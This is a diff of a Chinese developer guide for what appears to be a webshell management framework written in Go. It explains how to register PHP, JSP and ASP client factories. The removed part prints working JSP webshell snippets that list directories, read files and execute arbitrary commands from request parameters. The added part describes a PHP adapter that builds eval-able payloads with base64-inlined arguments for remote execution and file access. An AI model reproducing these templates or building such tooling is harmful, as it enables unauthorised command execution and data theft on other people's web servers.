@@ -118,16 +118,22 @@ func (f *ClientFactory) NewClient(ctx context.Context, rec *core.NodeRecord) (*c
 
 ## 5. 注册到 Manager
 
-方法一：使用默认 Factory + WrapOp：
+方法一：自定义 Factory（推荐）：
 
 ```go
-mgr := core.NewManager(registry, core.DefaultClientFactory())
+// 使用 PHP 适配器内置的工厂
+mgr := core.NewManager(registry, phpshell.NewClientFactory())
+
+// 或接入自己的 JSP / ASP 工厂
+mgr := core.NewManager(registry, jspadapter.NewClientFactory())
 ```
 
-方法二：指定自定义 Factory：
+方法二：默认 Factory（仅限跑测试 / 接自定义 selector）：
 
 ```go
-mgr := core.NewManager(registry, jspadapter.NewClientFactory())
+// ⚠️ 默认工厂对所有内置 transport/codec/envelope 都返回错误或 nil，
+// 无法直接用于真实环境。必须提供自定义 ClientFactory。
+mgr := core.NewManager(registry, core.DefaultClientFactory())
 ```
 
 使用：
@@ -139,35 +145,17 @@ res, _ := client.Do(ctx, jspadapter.NewJspInfo())
 
 ---
 
-## 常见 PHP 模板片段
+## 参考：PHP 适配器实现
 
-```jsp
-<%-- 列目录 --%>
-<%
-String path = request.getParameter("path");
-java.io.File dir = new java.io.File(path);
-for (java.io.File f : dir.listFiles()) {
-    out.print(f.getName() + (f.isDirectory() ? "/" : "") + "\t");
-}
-%>
+编写 JSP / ASP 适配器前，先读 `adapter/php/` 作为最完整的参考：
 
-<%-- 读文件 --%>
-<%
-String path = request.getParameter("path");
-java.util.Scanner s = new java.util.Scanner(new java.io.File(path));
-while (s.hasNextLine()) out.println(s.nextLine());
-s.close();
-%>
+- `renderer.go` — 生成可 eval 的 PHP 源码模板
+- `operations.go` — Build 阶段把参数 base64 内联、塞入 payload；Parse 阶段结构化响应
+- `client_factory.go` — `WrapOp` 把通用 ops 替换成专属版本
+- `capabilities.go` — 声明 `CapInfo / CapExec / CapFileList / CapFileRead`
 
-<%-- 执行命令 --%>
-<%
-String cmd = request.getParameter("cmd");
-Process p = Runtime.getRuntime().exec(cmd);
-java.util.Scanner s = new java.util.Scanner(p.getInputStream());
-while (s.hasNextLine()) out.println(s.nextLine());
-s.close();
-%>
-```
+PHP 适配器采用"自包含"模式：参数 base64 编码后直接内联到源码字符串里，
+不依赖 `$_POST` 字段，远端 eval 即可直接拿到值。
 
 ---
 
